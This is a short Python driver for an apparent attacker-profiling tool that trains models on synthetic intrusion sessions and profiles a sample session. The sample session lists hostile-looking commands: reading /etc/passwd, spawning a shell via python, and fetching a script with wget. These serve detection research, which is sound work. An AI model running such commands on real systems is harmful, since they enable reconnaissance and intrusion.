import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from attacker_profiler.step1_playbook import build_playbook_index
from attacker_profiler.step2_generate import generate_synthetic_sessions
from attacker_profiler.step4_train import train_models
from attacker_profiler.step5_infer import AttackerProfiler


def main():
    playbook_index = build_playbook_index()
    sessions = generate_synthetic_sessions(playbook_index, num_sessions=40, seed=7)
    model_path, metrics = train_models(sessions, playbook_index)
    print("Model saved:", model_path)
    print("Metrics:", metrics)

    sample_commands = [
        "whoami",
        "cat /etc/passwd",
        "python -c \"import os; os.system('/bin/sh')\"",
        "wget http://example.com/tool.sh",
    ]

    profiler = AttackerProfiler(model_path=model_path)
    result = profiler.analyze_session(sample_commands)
    print("Profile:", result)


if __name__ == "__main__":
    main()
